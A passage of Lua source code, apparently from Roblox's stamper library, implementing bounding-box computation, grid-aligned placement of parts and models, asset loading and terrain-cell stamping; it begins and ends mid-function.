				maxVec = partOrModel:GetModelSize()*0.5
				minVec = -maxVec
			end
		
			-- Adjust bounding box to reflect what the model or part author wants in  terms of justification
			local justifyValue = partOrModel:FindFirstChild("Justification")
			if justifyValue ~= nil then
				-- find the multiple of 4 that contains the model
				local justify = justifyValue.Value
				local two = Vector3.new(2, 2, 2)
				local actualBox = maxVec - minVec - Vector3.new(0.01, 0.01, 0.01)
				local containingGridBox = Vector3.new(4 * math.ceil(actualBox.x/4), 4 * math.ceil(actualBox.y/4), 4 * math.ceil(actualBox.z/4))
				local adjustment = containingGridBox - actualBox
				minVec = minVec - 0.5 * adjustment * justify
				maxVec = maxVec + 0.5 * adjustment * (two - justify)
			end
		
			return minVec, maxVec
		end
		
		local function getBoundingBoxInWorldCoordinates(partOrModel)
			local minVec = Vector3.new(math.huge, math.huge, math.huge)
			local maxVec = Vector3.new(-math.huge, -math.huge, -math.huge)
		
			if partOrModel:IsA("BasePart") and not partOrModel:IsA("Terrain") then
				local vec1 = partOrModel.CFrame:pointToWorldSpace(-0.5 * partOrModel.Size)
				local vec2 = partOrModel.CFrame:pointToWorldSpace(0.5 * partOrModel.Size)
				minVec = Vector3.new(math.min(vec1.X, vec2.X), math.min(vec1.Y, vec2.Y), math.min(vec1.Z, vec2.Z))
				maxVec = Vector3.new(math.max(vec1.X, vec2.X), math.max(vec1.Y, vec2.Y), math.max(vec1.Z, vec2.Z))
			elseif partOrModel:IsA("Terrain") then
				-- we shouldn't have to deal with this case
				--minVec = Vector3.new(-2, -2, -2)
				--maxVec = Vector3.new(2, 2, 2)
			else
				local vec1 = partOrModel:GetModelCFrame():pointToWorldSpace(-0.5 * partOrModel:GetModelSize())
				local vec2 = partOrModel:GetModelCFrame():pointToWorldSpace(0.5 * partOrModel:GetModelSize())
				minVec = Vector3.new(math.min(vec1.X, vec2.X), math.min(vec1.Y, vec2.Y), math.min(vec1.Z, vec2.Z))
				maxVec = Vector3.new(math.max(vec1.X, vec2.X), math.max(vec1.Y, vec2.Y), math.max(vec1.Z, vec2.Z))
			end
		
			return minVec, maxVec
		end
		
		local function getTargetPartBoundingBox(targetPart)
			if targetPart.Parent:FindFirstChild("RobloxModel") ~= nil then
				return getBoundingBox2(targetPart.Parent)
			else
				return getBoundingBox2(targetPart)
			end
		end
		
		local function getMouseTargetCFrame(targetPart)
			if targetPart.Parent:FindFirstChild("RobloxModel") ~= nil then
				if targetPart.Parent:IsA("Tool") then return targetPart.Parent.Handle.CFrame
				else return targetPart.Parent:GetModelCFrame() end
			else
				return targetPart.CFrame
			end
		end
		
		local function isBlocker(part) -- returns whether or not we want to cancel the stamp because we're blocked by this part
			if not part then return false end
			if not part.Parent then return false end
			if part:FindFirstChild("Humanoid") then return false end
			if part:FindFirstChild("RobloxStamper") or part:FindFirstChild("RobloxModel") then return true end
			if part:IsA("Part") and not part.CanCollide then return false end
			if part == game:GetService("Lighting") then return false end
			return isBlocker(part.Parent)
		end
		
		-- helper function to determine if a character can be pushed upwards by a certain amount
		-- character is 5 studs tall, we'll check a 1.5 x 1.5 x 4.5 box around char, with center .5 studs below torsocenter
		local function spaceAboveCharacter(charTorso, newTorsoY, stampData)
			local partsAboveChar = game:GetService("Workspace"):FindPartsInRegion3(
				Region3.new(Vector3.new(charTorso.Position.X, newTorsoY, charTorso.Position.Z) - Vector3.new(.75, 2.75, .75),
				Vector3.new(charTorso.Position.X, newTorsoY, charTorso.Position.Z) + Vector3.new(.75, 1.75, .75)),
				charTorso.Parent,
				100)
		
			for j = 1, #partsAboveChar do
				if partsAboveChar[j].CanCollide and not partsAboveChar[j]:IsDescendantOf(stampData.CurrentParts) then return false end
			end
		
			if clusterPartsInRegion(Vector3.new(charTorso.Position.X, newTorsoY, charTorso.Position.Z) - Vector3.new(.75, 2.75, .75),
				Vector3.new(charTorso.Position.X, newTorsoY, charTorso.Position.Z) + Vector3.new(.75, 1.75, .75)) then
					return false
			end
		
			return true
		end
		
		
		local function findConfigAtMouseTarget(Mouse, stampData)
			-- *Critical Assumption* :
			--				This function assumes the target CF axes are orthogonal with the target bounding box faces
			--				And, it assumes the insert CF axes are orthongonal with the insert bounding box faces
			--				Therefore, insertion will not work with angled faces on wedges or other "non-block" parts, nor
			--				will it work for parts in a model that are not orthogonally aligned with the model's CF.
		
			if not Mouse then return nil end -- This can happen sometimes, return if so
			if not stampData then error("findConfigAtMouseTarget: stampData is nil") return nil end
			if not stampData["CurrentParts"] then return nil end
		
			local grid = 4.0
			local admissibleConfig = false
			local targetConfig = CFrame.new(0,0,0)
		
			local minBB, maxBB = getBoundingBox2(stampData.CurrentParts)
			local diagBB = maxBB - minBB
		
			local insertCFrame
			if stampData.CurrentParts:IsA("Model") or stampData.CurrentParts:IsA("Tool") then
				insertCFrame = stampData.CurrentParts:GetModelCFrame()
			else
				insertCFrame = stampData.CurrentParts.CFrame
			end
		
			if Mouse then
				if stampData.CurrentParts:IsA("Tool") then
					Mouse.TargetFilter = stampData.CurrentParts.Handle
				else
					Mouse.TargetFilter = stampData.CurrentParts
				end
			end
		
			local hitPlane = false
			local targetPart = nil
			local success = pcall(function() targetPart = Mouse.Target end)
		
			if not success then-- or targetPart == nil then
				return admissibleConfig, targetConfig
			end
		
			local mouseHitInWorld = Vector3.new(0, 0, 0)
			if Mouse then
				mouseHitInWorld = Vector3.new(Mouse.Hit.x, Mouse.Hit.y, Mouse.Hit.z)
			end
		
			local cellPos = nil
		
			-- Nothing was hit, so check for the default plane.
			if nil == targetPart then
				cellPos = GetTerrainForMouse(Mouse)
				if nil == cellPos then
					hitPlane = false
					return admissibleConfig, targetConfig
				else
					targetPart = game:GetService("Workspace").Terrain
					hitPlane = true
					-- Take into account error that will occur.
					cellPos = Vector3.new(cellPos.X - 1, cellPos.Y, cellPos.Z)
					mouseHitInWorld = game:GetService("Workspace").Terrain:CellCenterToWorld(cellPos.x, cellPos.y, cellPos.z)
				end
			end
		
			-- test mouse hit location
			local minBBTarget, maxBBTarget = getTargetPartBoundingBox(targetPart)
			local diagBBTarget = maxBBTarget - minBBTarget
			local targetCFrame = getMouseTargetCFrame(targetPart)
		
			if targetPart:IsA("Terrain") then
				local cluster = game:GetService("Workspace"):FindFirstChild("Terrain")
				local cellID = cluster:WorldToCellPreferSolid(mouseHitInWorld)
				if hitPlane then
					cellID = cellPos
				end
		
				targetCFrame = CFrame.new(game:GetService("Workspace").Terrain:CellCenterToWorld(cellID.x, cellID.y, cellID.z))
			end
		
			local mouseHitInTarget = targetCFrame:pointToObjectSpace(mouseHitInWorld)
			local targetVectorInWorld = Vector3.new(0,0,0)
			if Mouse then
				-- DON'T WANT THIS IN TERMS OF THE MODEL CFRAME!  (.TargetSurface is in terms of the part CFrame, so this would break, right?  [HotThoth])
				--   (ideally, we would want to make the Mouse.TargetSurface a model-targetsurface instead, but for testing will be using the converse)
				--targetVectorInWorld = targetCFrame:vectorToWorldSpace(Vector3.FromNormalId(Mouse.TargetSurface))
				targetVectorInWorld = targetPart.CFrame:vectorToWorldSpace(Vector3.FromNormalId(Mouse.TargetSurface))   -- better, but model cframe would be best
				--[[if targetPart.Parent:IsA("Model") then
					local hitFace = modelTargetSurface(targetPart.Parent, Mouse.Hit.p, game.Workspace.CurrentCamera.CoordinateFrame.p)  -- best, if you get it right
					local WORLD_AXES = {Vector3.new(1, 0, 0), Vector3.new(0, 1, 0), Vector3.new(0, 0, 1)}
					if hitFace > 0 then
						targetVectorInWorld = targetCFrame:vectorToWorldSpace(WORLD_AXES[hitFace])
					elseif hitFace < 0 then
						targetVectorInWorld = targetCFrame:vectorToWorldSpace(-WORLD_AXES[-hitFace])
					end
				end]]
			end
		
			local targetRefPointInTarget
			local clampToSurface
			local insertRefPointInInsert
		
			if getClosestAlignedWorldDirection(targetVectorInWorld) == 0 then
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(1, -1, 1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(-1, -1, 1))
				clampToSurface = Vector3.new(0,1,1)
			elseif getClosestAlignedWorldDirection(targetVectorInWorld) == 3 then
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(-1, -1, -1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(1, -1, -1))
				clampToSurface = Vector3.new(0,1,1)
			elseif getClosestAlignedWorldDirection(targetVectorInWorld) == 1 then
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(-1, 1, 1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(-1, -1, 1))
				clampToSurface = Vector3.new(1,0,1)
			elseif getClosestAlignedWorldDirection(targetVectorInWorld) == 4 then
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(-1, -1, 1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(-1, 1, 1))
				clampToSurface = Vector3.new(1,0,1)
			elseif getClosestAlignedWorldDirection(targetVectorInWorld) == 2 then
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(-1, -1, 1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(-1, -1, -1))
				clampToSurface = Vector3.new(1,1,0)
			else
				targetRefPointInTarget = targetCFrame:vectorToObjectSpace(Vector3.new(1, -1, -1))
				insertRefPointInInsert = insertCFrame:vectorToObjectSpace(Vector3.new(1, -1, 1))
				clampToSurface = Vector3.new(1,1,0)
			end
		
			targetRefPointInTarget = targetRefPointInTarget * (0.5 * diagBBTarget) + 0.5 * (maxBBTarget + minBBTarget)
			insertRefPointInInsert = insertRefPointInInsert * (0.5 * diagBB) + 0.5 * (maxBB + minBB)
		
			-- To Do: For cases that are not aligned to the world grid, account for the minimal rotation
			-- needed to bring the Insert part(s) into alignment with the Target Part
			-- Apply the rotation here
		
			local delta = mouseHitInTarget - targetRefPointInTarget
			local deltaClamped = Vector3.new(grid * math.modf(delta.x/grid), grid * math.modf(delta.y/grid), grid * math.modf(delta.z/grid))
			deltaClamped = deltaClamped * clampToSurface
			local targetTouchInTarget = deltaClamped + targetRefPointInTarget
		
			local TargetTouchRelToWorld = targetCFrame:pointToWorldSpace(targetTouchInTarget)
			local InsertTouchInWorld = insertCFrame:vectorToWorldSpace(insertRefPointInInsert)
			local posInsertOriginInWorld = TargetTouchRelToWorld - InsertTouchInWorld
		
			local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = insertCFrame:components()
			targetConfig = CFrame.new(posInsertOriginInWorld.x, posInsertOriginInWorld.y, posInsertOriginInWorld.z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
			admissibleConfig = true
		
			return admissibleConfig, targetConfig, getClosestAlignedWorldDirection(targetVectorInWorld)
		end
		
		local function truncateToCircleEighth(bigValue, littleValue)
			local big = math.abs(bigValue)
			local little = math.abs(littleValue)
			local hypotenuse = math.sqrt(big*big + little*little)
			local frac = little / hypotenuse
		
			local bigSign = 1
			local littleSign = 1
			if bigValue < 0 then bigSign = -1 end
			if littleValue < 0 then littleSign = -1 end
		
			if frac > .382683432 then
				-- between 22.5 and 45 degrees, so truncate to 45-degree tilt
				return .707106781 * hypotenuse * bigSign, .707106781 * hypotenuse * littleSign
			else
				-- between 0 and 22.5 degrees, so truncate to 0-degree tilt
				return hypotenuse * bigSign, 0
			end
		end
		
		
		local function saveTheWelds(object, manualWeldTable, manualWeldParentTable)
			if object:IsA("ManualWeld") or object:IsA("Rotate") then
				table.insert(manualWeldTable, object)
				table.insert(manualWeldParentTable, object.Parent)
			else
				local children = object:GetChildren()
				for i = 1, #children do
					saveTheWelds(children[i], manualWeldTable, manualWeldParentTable)
				end
			end
		end
		
		local function restoreTheWelds(manualWeldTable, manualWeldParentTable)
			for i = 1, #manualWeldTable do
				manualWeldTable[i].Parent = manualWeldParentTable[i]
			end
		end
		
		t.CanEditRegion = function(partOrModel, EditRegion) -- todo: use model and stamper metadata
			if not EditRegion then return true, false end
		
			local minBB, maxBB = getBoundingBoxInWorldCoordinates(partOrModel)
		
			if minBB.X < EditRegion.CFrame.p.X - EditRegion.Size.X/2 or
				minBB.Y < EditRegion.CFrame.p.Y - EditRegion.Size.Y/2 or
				minBB.Z < EditRegion.CFrame.p.Z - EditRegion.Size.Z/2 then
					return false, false
			end
		
			if maxBB.X > EditRegion.CFrame.p.X + EditRegion.Size.X/2 or
				maxBB.Y > EditRegion.CFrame.p.Y + EditRegion.Size.Y/2 or
				maxBB.Z > EditRegion.CFrame.p.Z + EditRegion.Size.Z/2 then
					return false, false
			end
		
			return true, false
		end
		
		t.GetStampModel = function(assetId, terrainShape, useAssetVersionId)
			if assetId == 0 then
				return nil, "No Asset"
			end
			if assetId < 0 then
				return nil, "Negative Asset"
			end
		
			local function UnlockInstances(object)
				if object:IsA("BasePart") then
					object.Locked = false
				end
				for index,child in pairs(object:GetChildren()) do
					UnlockInstances(child)
				end
			end
		
			local function getClosestColorToTerrainMaterial(terrainValue)
				if terrainValue == 1 then
					return BrickColor.new("Bright green")
				elseif terrainValue == 2 then
					return BrickColor.new("Bright yellow")
				elseif terrainValue == 3 then
					return BrickColor.new("Bright red")
				elseif terrainValue == 4 then
					return BrickColor.new("Sand red")
				elseif terrainValue == 5 then
					return BrickColor.new("Black")
				elseif terrainValue == 6 then
					return BrickColor.new("Dark stone grey")
				elseif terrainValue == 7 then
					return BrickColor.new("Sand blue")
				elseif terrainValue == 8 then
					return BrickColor.new("Deep orange")
				elseif terrainValue == 9 then
					return BrickColor.new("Dark orange")
				elseif terrainValue == 10 then
					return BrickColor.new("Reddish brown")
				elseif terrainValue == 11 then
					return BrickColor.new("Light orange")
				elseif terrainValue == 12 then
					return BrickColor.new("Light stone grey")
				elseif terrainValue == 13 then
					return BrickColor.new("Sand green")
				elseif terrainValue == 14 then
					return BrickColor.new("Medium stone grey")
				elseif terrainValue == 15 then
					return BrickColor.new("Really red")
				elseif terrainValue == 16 then
					return BrickColor.new("Really blue")
				elseif terrainValue == 17 then
					return BrickColor.new("Bright blue")
				else
					return BrickColor.new("Bright green")
				end
			end
		
			local function setupFakeTerrainPart(cellMat, cellType, cellOrient)
				local newTerrainPiece = nil
				if (cellType == 1 or cellType == 4) then newTerrainPiece = Instance.new("WedgePart")
				elseif (cellType == 2) then newTerrainPiece = Instance.new("CornerWedgePart")
				else newTerrainPiece = Instance.new("Part") end
				newTerrainPiece.Name = "MegaClusterCube"
				newTerrainPiece.Size = Vector3.new(4, 4, 4)
				newTerrainPiece.BottomSurface = "Smooth"
				newTerrainPiece.TopSurface = "Smooth"
		
				-- can add decals or textures here if feeling particularly adventurous...  for now, can make a table of look-up colors
				newTerrainPiece.BrickColor = getClosestColorToTerrainMaterial(cellMat)
		
				local sideways = 0
				local flipped = math.pi
				if cellType == 4 then sideways = -math.pi/2 end
				if cellType == 2 or cellType == 3 then flipped = 0 end
				newTerrainPiece.CFrame = CFrame.Angles(0, math.pi/2*cellOrient + flipped, sideways)
		
				if cellType == 3 then
					local inverseCornerWedgeMesh = Instance.new("SpecialMesh")
					inverseCornerWedgeMesh.MeshType = "FileMesh"
					inverseCornerWedgeMesh.MeshId = "https://www.roblox.com/asset/?id=66832495"
					inverseCornerWedgeMesh.Scale = Vector3.new(2, 2, 2)
					inverseCornerWedgeMesh.Parent = newTerrainPiece
				end
		
				local materialTag = Instance.new("Vector3Value")
				materialTag.Value = Vector3.new(cellMat, cellType, cellOrient)
				materialTag.Name = "ClusterMaterial"
				materialTag.Parent = newTerrainPiece
		
				return newTerrainPiece
			end
		
			-- This call will cause a "wait" until the data comes back
			-- below we wait a max of 8 seconds before deciding to bail out on loading
			local root
			local loader
			loading = true
			if useAssetVersionId then
				loader = coroutine.create(function()
					root = game:GetService("InsertService"):LoadAssetVersion(assetId)
					loading = false
				end)
				coroutine.resume(loader)
			else
				loader = coroutine.create(function()
					root = game:GetService("InsertService"):LoadAsset(assetId)
					loading = false
				end)
				coroutine.resume(loader)
			end
		
			local lastGameTime = 0
			local totalTime = 0
			local maxWait = 8
			while loading and totalTime < maxWait do
				lastGameTime = tick()
				wait(1)
				totalTime = totalTime + tick() - lastGameTime
			end
			loading = false
		
			if totalTime >= maxWait then
				return nil, "Load Time Fail"
			end
		
		
			if root == nil then
				return nil, "Load Asset Fail"
			end
		
			if not root:IsA("Model") then
				return nil, "Load Type Fail"
			end
		
			local instances = root:GetChildren()
			if #instances == 0 then
				return nil, "Empty Model Fail"
			end
		
			--Unlock all parts that are inserted, to make sure they are editable
			UnlockInstances(root)
		
			--Continue the insert process
			root = root:GetChildren()[1]
		
			--Examine the contents and decide what it looks like
			for pos, instance in pairs(instances) do
				if instance:IsA("Team") then
					instance.Parent = game:GetService("Teams")
				elseif instance:IsA("Sky") then
					local lightingService = game:GetService("Lighting")
					for index,child in pairs(lightingService:GetChildren()) do
						if child:IsA("Sky") then
							child:Remove();
						end
					end
					instance.Parent = lightingService
					return
				end
			end
		
			-- ...and tag all inserted models for subsequent origin identification
			-- if no RobloxModel tag already exists, then add it.
			if root:FindFirstChild("RobloxModel") == nil then
				local stringTag = Instance.new("BoolValue", root)
				stringTag.Name = "RobloxModel"
		
				if root:FindFirstChild("RobloxStamper") == nil then
					local stringTag2 = Instance.new("BoolValue", root)
					stringTag2.Name = "RobloxStamper"
				end
			end
		
			if terrainShape then
				if root.Name == "MegaClusterCube" then
					if (terrainShape == 6) then -- insert an autowedging tag
						local autowedgeTag = Instance.new("BoolValue")
						autowedgeTag.Name = "AutoWedge"
						autowedgeTag.Parent = root
					else
						local clusterTag = root:FindFirstChild("ClusterMaterial")
						if clusterTag then
							if clusterTag:IsA("Vector3Value") then
								root = setupFakeTerrainPart(clusterTag.Value.X, terrainShape, clusterTag.Value.Z)
							else
								root = setupFakeTerrainPart(clusterTag.Value, terrainShape, 0)
							end
						else
							root = setupFakeTerrainPart(1, terrainShape, 0)
						end
					end
				end
			end
		
			return root
		end
		
		
		
		t.SetupStamperDragger = function(modelToStamp, Mouse, StampInModel, AllowedStampRegion, StampFailedFunc)
			if not modelToStamp then
				error("SetupStamperDragger: modelToStamp (first arg) is nil!  Should be a stamper model")
				return nil
			end
			if not modelToStamp:IsA("Model") and not modelToStamp:IsA("BasePart") then
				error("SetupStamperDragger: modelToStamp (first arg) is neither a Model or Part!")
				return nil
			end
			if not Mouse then
				error("SetupStamperDragger: Mouse (second arg) is nil!  Should be a mouse object")
				return nil
			end
			if not Mouse:IsA("Mouse") then
				error("SetupStamperDragger: Mouse (second arg) is not of type Mouse!")
				return nil
			end
		
			local stampInModel = nil
			local allowedStampRegion = nil
			local stampFailedFunc = nil
			if StampInModel then
				if not StampInModel:IsA("Model") then
					error("SetupStamperDragger: StampInModel (optional third arg) is not of type 'Model'")
					return nil
				end
				if not AllowedStampRegion then
					error("SetupStamperDragger: AllowedStampRegion (optional fourth arg) is nil when StampInModel (optional third arg) is defined")
					return nil
				end
				stampFailedFunc = StampFailedFunc
				stampInModel = StampInModel
				allowedStampRegion = AllowedStampRegion
			end
		
			-- Init all state variables
			local gInitial90DegreeRotations = 0
			local stampData = nil
			local mouseTarget = nil
		
			local errorBox = Instance.new("SelectionBox")
			errorBox.Color = BrickColor.new("Bright red")
			errorBox.Transparency = 0
			errorBox.Archivable = false
		
			-- for megacluster MEGA STAMPING
			local adornPart = Instance.new("Part")
			adornPart.Parent = nil
			adornPart.Size = Vector3.new(4, 4, 4)
			adornPart.CFrame = CFrame.new()
			adornPart.Archivable = false
		
			local adorn = Instance.new("SelectionBox")
			adorn.Color = BrickColor.new("Toothpaste")
			adorn.Adornee = adornPart
			adorn.Visible = true
			adorn.Transparency = 0
			adorn.Name = "HighScalabilityStamperLine"
			adorn.Archivable = false
		
			local HighScalabilityLine = {}
			HighScalabilityLine.Start = nil
			HighScalabilityLine.End = nil
			HighScalabilityLine.Adorn = adorn
			HighScalabilityLine.AdornPart = adornPart
			HighScalabilityLine.InternalLine = nil
			HighScalabilityLine.NewHint = true
		
			HighScalabilityLine.MorePoints = {nil, nil}
			HighScalabilityLine.MoreLines = {nil, nil}
			HighScalabilityLine.Dimensions = 1
		
			local control = {}
			local movingLock = false
			local stampUpLock = false
			local unstampableSurface = false
			local mouseCons = {}
			local keyCon = nil
		
			local stamped = Instance.new("BoolValue")
			stamped.Archivable = false
			stamped.Value = false
		
			local lastTarget = {}
			lastTarget.TerrainOrientation = 0
			lastTarget.CFrame = 0
		
			local cellInfo = {}
			cellInfo.Material = 1
			cellInfo.clusterType = 0
			cellInfo.clusterOrientation = 0
		
			local function isMegaClusterPart()
				if not stampData then return false end
				if not stampData.CurrentParts then return false end
		
				return ( stampData.CurrentParts:FindFirstChild("ClusterMaterial",true) or (stampData.CurrentParts.Name == "MegaClusterCube") )
			end
		
			local function DoHighScalabilityRegionSelect()
				local megaCube = stampData.CurrentParts:FindFirstChild("MegaClusterCube")
				if not megaCube then
					if not stampData.CurrentParts.Name == "MegaClusterCube" then
						return
					else
						megaCube = stampData.CurrentParts
					end
				end
		
				HighScalabilityLine.End = megaCube.CFrame.p
				local line = nil
				local line2 = Vector3.new(0, 0, 0)
				local line3 = Vector3.new(0, 0, 0)
		
				if HighScalabilityLine.Dimensions == 1 then
					-- extract the line from these positions and limit to a 2D plane made from 2 of the world axes
					--   then use dominating axis to limit line to be at 45-degree intervals
					--   will use this internal representation of the line for the actual stamping
					line = (HighScalabilityLine.End - HighScalabilityLine.Start)
		
					if math.abs(line.X) < math.abs(line.Y) then
						if math.abs(line.X) < math.abs(line.Z) then
							-- limit to Y/Z plane, domination unknown
							local newY, newZ
							if (math.abs(line.Y) > math.abs(line.Z)) then
								newY, newZ = truncateToCircleEighth(line.Y, line.Z)
							else
								newZ, newY = truncateToCircleEighth(line.Z, line.Y)
							end
							line = Vector3.new(0, newY, newZ)
						else
							-- limit to X/Y plane, with Y dominating
							local newY, newX = truncateToCircleEighth(line.Y, line.X)
							line = Vector3.new(newX, newY, 0)
						end
					else
						if math.abs(line.Y) < math.abs(line.Z) then
							-- limit to X/Z plane, domination unknown
							local newX, newZ
							if math.abs(line.X) > math.abs(line.Z) then
								newX, newZ = truncateToCircleEighth(line.X, line.Z)
							else
								newZ, newX = truncateToCircleEighth(line.Z, line.X)
							end
							line = Vector3.new(newX, 0, newZ)
						else
							-- limit to X/Y plane, with X dominating
							local newX, newY = truncateToCircleEighth(line.X, line.Y)
							line = Vector3.new(newX, newY, 0)
						end
					end
					HighScalabilityLine.InternalLine = line
		
				elseif HighScalabilityLine.Dimensions == 2 then
					line = HighScalabilityLine.MoreLines[1]
					line2 = HighScalabilityLine.End - HighScalabilityLine.MorePoints[1]
		
					-- take out any component of line2 along line1, so you get perpendicular to line1 component
					line2 = line2 - line.unit*line.unit:Dot(line2)
		
					local tempCFrame = CFrame.new(HighScalabilityLine.Start, HighScalabilityLine.Start + line)
		
					-- then zero out whichever is the smaller component
					local yAxis = tempCFrame:vectorToWorldSpace(Vector3.new(0, 1, 0))
					local xAxis = tempCFrame:vectorToWorldSpace(Vector3.new(1, 0, 0))
		
					local xComp = xAxis:Dot(line2)
					local yComp = yAxis:Dot(line2)
		
					if math.abs(yComp) > math.abs(xComp) then
						line2 = line2 - xAxis * xComp
					else
						line2 = line2 - yAxis * yComp
					end
		
					HighScalabilityLine.InternalLine = line2
		
				elseif HighScalabilityLine.Dimensions == 3 then
					line  = HighScalabilityLine.MoreLines[1]
					line2 = HighScalabilityLine.MoreLines[2]
					line3 = HighScalabilityLine.End - HighScalabilityLine.MorePoints[2]
		
					-- zero out all components of previous lines
					line3 = line3 - line.unit * line.unit:Dot(line3)
					line3 = line3 - line2.unit * line2.unit:Dot(line3)
		
					HighScalabilityLine.InternalLine = line3
				end
		
				-- resize the "line" graphic to be the correct size and orientation
				local tempCFrame = CFrame.new(HighScalabilityLine.Start, HighScalabilityLine.Start + line)
		
				if HighScalabilityLine.Dimensions == 1 then  -- faster calculation for line
					HighScalabilityLine.AdornPart.Size = Vector3.new(4, 4, line.magnitude + 4)
					HighScalabilityLine.AdornPart.CFrame = tempCFrame + tempCFrame:vectorToWorldSpace(Vector3.new(2, 2, 2) - HighScalabilityLine.AdornPart.Size/2)
				else
					local boxSize = tempCFrame:vectorToObjectSpace(line + line2 + line3)
					HighScalabilityLine.AdornPart.Size = Vector3.new(4, 4, 4) + Vector3.new(math.abs(boxSize.X), math.abs(boxSize.Y), math.abs(boxSize.Z))
					HighScalabilityLine.AdornPart.CFrame = tempCFrame + tempCFrame:vectorToWorldSpace(boxSize/2)
				end
		
				-- make player able to see this ish
		
				local gui = nil
				if game:GetService("Players")["LocalPlayer"] then
					gui = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
					if gui and gui:IsA("PlayerGui") then
						if HighScalabilityLine.Dimensions == 1 and line.magnitude > 3 then -- don't show if mouse hasn't moved enough
							HighScalabilityLine.Adorn.Parent = gui
						elseif HighScalabilityLine.Dimensions > 1 then
							HighScalabilityLine.Adorn.Parent = gui
						end
					end
				end
		
				if gui == nil then -- we are in studio
					gui = game:GetService("CoreGui")
					if HighScalabilityLine.Dimensions == 1 and line.magnitude > 3 then -- don't show if mouse hasn't moved enough
						HighScalabilityLine.Adorn.Parent = gui
					elseif HighScalabilityLine.Dimensions > 1 then
						HighScalabilityLine.Adorn.Parent = gui
					end
				end
			end
		
		
			local function DoStamperMouseMove(Mouse)
				if not Mouse then
					error("Error: RbxStamper.DoStamperMouseMove: Mouse is nil")
					return
				end
				if not Mouse:IsA("Mouse") then
					error("Error: RbxStamper.DoStamperMouseMove: Mouse is of type", Mouse.className,"should be of type Mouse")
					return
				end
		
				-- There wasn't a target (no part or terrain), so check for plane intersection.
				if not Mouse.Target then
					local cellPos = GetTerrainForMouse(Mouse)
					if nil == cellPos then
						return
					end
				end
		
				if not stampData then
					return
				end
		
				-- don't move with dragger - will move in one step on mouse down
				-- draw ghost at acceptable positions
				local configFound, targetCFrame, targetSurface = findConfigAtMouseTarget(Mouse, stampData)
				if not configFound then
					error("RbxStamper.DoStamperMouseMove No configFound, returning")
					return
				end
		
				local numRotations = 0 -- update this according to how many rotations you need to get it to target surface
				if autoAlignToFace(stampData.CurrentParts) and targetSurface ~= 1 and targetSurface ~= 4 then -- pre-rotate the flag or portrait so it's aligned correctly
					if		targetSurface == 3 then numRotations = 0 - gInitial90DegreeRotations + autoAlignToFace(stampData.CurrentParts)
					elseif	targetSurface == 0 then numRotations = 2 - gInitial90DegreeRotations + autoAlignToFace(stampData.CurrentParts)
					elseif	targetSurface == 5 then numRotations = 3 - gInitial90DegreeRotations + autoAlignToFace(stampData.CurrentParts)
					elseif	targetSurface == 2 then numRotations = 1 - gInitial90DegreeRotations + autoAlignToFace(stampData.CurrentParts)
					end
				end
		
				local ry = math.pi/2
				gInitial90DegreeRotations = gInitial90DegreeRotations + numRotations
				if stampData.CurrentParts:IsA("Model") or stampData.CurrentParts:IsA("Tool") then
					--stampData.CurrentParts:Rotate(0, ry*numRotations, 0)
					modelRotate(stampData.CurrentParts, ry*numRotations)
				else
					stampData.CurrentParts.CFrame = CFrame.fromEulerAnglesXYZ(0, ry*numRotations, 0) * stampData.CurrentParts.CFrame
				end
		
				-- CODE TO CHECK FOR DRAGGING GHOST PART INTO A COLLIDING STATE
				local minBB, maxBB = getBoundingBoxInWorldCoordinates(stampData.CurrentParts)
		
				-- need to offset by distance to be dragged
				local currModelCFrame = nil
				if stampData.CurrentParts:IsA("Model") then
					currModelCFrame = stampData.CurrentParts:GetModelCFrame()
				else
					currModelCFrame = stampData.CurrentParts.CFrame
				end
		
				minBB = minBB + targetCFrame.p - currModelCFrame.p
				maxBB = maxBB + targetCFrame.p - currModelCFrame.p
		
				-- don't drag into terrain
				if clusterPartsInRegion(minBB + insertBoundingBoxOverlapVector, maxBB - insertBoundingBoxOverlapVector) then
					if lastTarget.CFrame then
						if (stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)) then
							local theClusterMaterial = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
							if theClusterMaterial:IsA("Vector3Value") then
								local stampClusterMaterial = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
								if stampClusterMaterial then
									stampClusterMaterial = theClusterMaterial
								end
							end
						end
					end
					return
				end
		
				-- if we are stamping a terrain part, make sure it goes on the grid! Otherwise preview block could be placed off grid, but stamped on grid
				if isMegaClusterPart() then
					local cellToStamp = game:GetService("Workspace").Terrain:WorldToCell(targetCFrame.p)
					local newCFramePosition = game:GetService("Workspace").Terrain:CellCenterToWorld(cellToStamp.X, cellToStamp.Y, cellToStamp.Z)
					local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = targetCFrame:components()
					targetCFrame = CFrame.new(newCFramePosition.X,newCFramePosition.Y,newCFramePosition.Z,R00, R01, R02, R10, R11, R12, R20, R21, R22)
				end
		
				positionPartsAtCFrame3(targetCFrame, stampData.CurrentParts)
				lastTarget.CFrame = targetCFrame  -- successful positioning, so update 'dat cframe
				if stampData.CurrentParts:FindFirstChild("ClusterMaterial", true) then
					local clusterMat = stampData.CurrentParts:FindFirstChild("ClusterMaterial", true)
					if clusterMat:IsA("Vector3Value") then
						lastTarget.TerrainOrientation = clusterMat.Value.Z
					end
				end
		
		
				-- auto break joints code
				if Mouse and Mouse.Target and Mouse.Target.Parent then
					local modelInfo = Mouse.Target:FindFirstChild("RobloxModel")
					if not modelInfo then modelInfo = Mouse.Target.Parent:FindFirstChild("RobloxModel") end
		
					local myModelInfo = stampData.CurrentParts:FindFirstChild("UnstampableFaces")
		
					--if (modelInfo and modelInfo.Parent:FindFirstChild("UnstampableFaces")) or (modelInfo and myModelInfo) then  -- need better targetSurface calcs
					if (true) then
						local breakingFaces = ""
